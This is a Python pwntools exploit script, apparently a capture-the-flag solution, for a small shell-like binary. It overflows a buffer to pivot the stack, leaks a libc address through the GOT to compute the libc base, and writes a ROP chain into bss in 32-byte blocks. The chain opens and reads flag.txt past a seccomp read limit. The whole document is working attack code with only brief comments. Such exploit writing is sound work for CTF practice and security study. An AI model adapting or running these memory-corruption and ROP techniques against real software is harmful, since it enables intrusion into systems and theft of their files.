#!/usr/bin/env python3

from pwn import *

e = ELF("./s")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

context.binary = e

def conn():
    if args.REMOTE:
        return remote("addr", 1337)
    elif args.GDB:
        return gdb.debug(e.path, "b *(shell+73)\nc")
    else:
        return process(e.path)

r = conn()

def main():
    # main idea: stack pivoting and returning to main for useful leaks
    r.sendafter(b'$ ', b'cat hello\x00' + b'a' * 6 + p64(e.got['exit'] + 0x10) + p64(e.sym['shell'] + 29))
    r.recv()
    
    r.sendline(p64(e.sym['shell'])[:-1])
    
    r.sendafter(b'$ ', b'cat hello\x00' + b'a' * 6 + p64(e.bss(64) + 0x10) + p64(e.sym['shell'] + 29))
    r.recv()
    
    # make sure the function has been linked
    libc_func = "setbuf"
    
    r.sendline(p64(e.got[libc_func]))
    
    r.sendafter(b'$ ', b'cat hello\x00' + b'a' * 6 + p64(e.bss(64) + 0x10) + p64(e.sym['exec'] + 443))
    r.recvuntil(b'cats\n')
    func_addr = r.recvuntil(b': command', drop = True)
    print(func_addr)
    func_addr = int.from_bytes(func_addr, byteorder="little")
    r.success(f"{libc_func} address: " + hex(func_addr))
    libc_off = func_addr - libc.sym[libc_func]
    print(hex(libc_off))
    assert libc_off & 0xfff == 0
    
    libc.address = libc_off
    
    # create a rop chain in bss
    r.sendafter(b'$ ', b'cat hello\x00' + b'a' * 6 + p64(e.bss(128) + 0x10) + p64(e.sym['shell']+29))
    r.recv()
    
    r.sendline(b'flag.txt')
    
    rop = ROP(libc)
    # constants.linux.amd64.SYS_open
    # rop chain will be quite long so send block by block
    # read multiple times due to the seccomp read length restriction
    rop.call("syscall", [constants.linux.amd64.SYS_open, e.bss(128), constants.linux.amd64.O_RDONLY])
    rop.read(3, e.bss(512), 32)
    rop.read(3, e.bss(544), 32)
    rop.puts(e.bss(512))
    
    ropchain = rop.chain()
    
    print(len(ropchain))
    
    for i in range(0, len(ropchain), 32):
        r.sendafter(b'$ ', b'cat hello\x00' + b'a' * 6 + p64(e.bss(192 + i) + 0x10) + p64(e.sym['shell']+29))
        r.recv()
        r.send(ropchain[i:i+32])
    
    # a double leave ret so we can control the rsp for the ROP to work
    log.info("About to rop")
    print(hex(e.bss(192)))
    r.sendafter(b'$ ', b'cat hello\x00' + b'a' * 6 + p64(e.bss(192) - 0x8) + p64(e.sym['shell']+29))
    r.recv()
    r.sendline(b'cat hello\x00' + b'a' * 6 + p64(e.bss(192) - 0x8)[:-1])
    #print(r.recv())
    r.interactive()


if __name__ == "__main__":
    main()
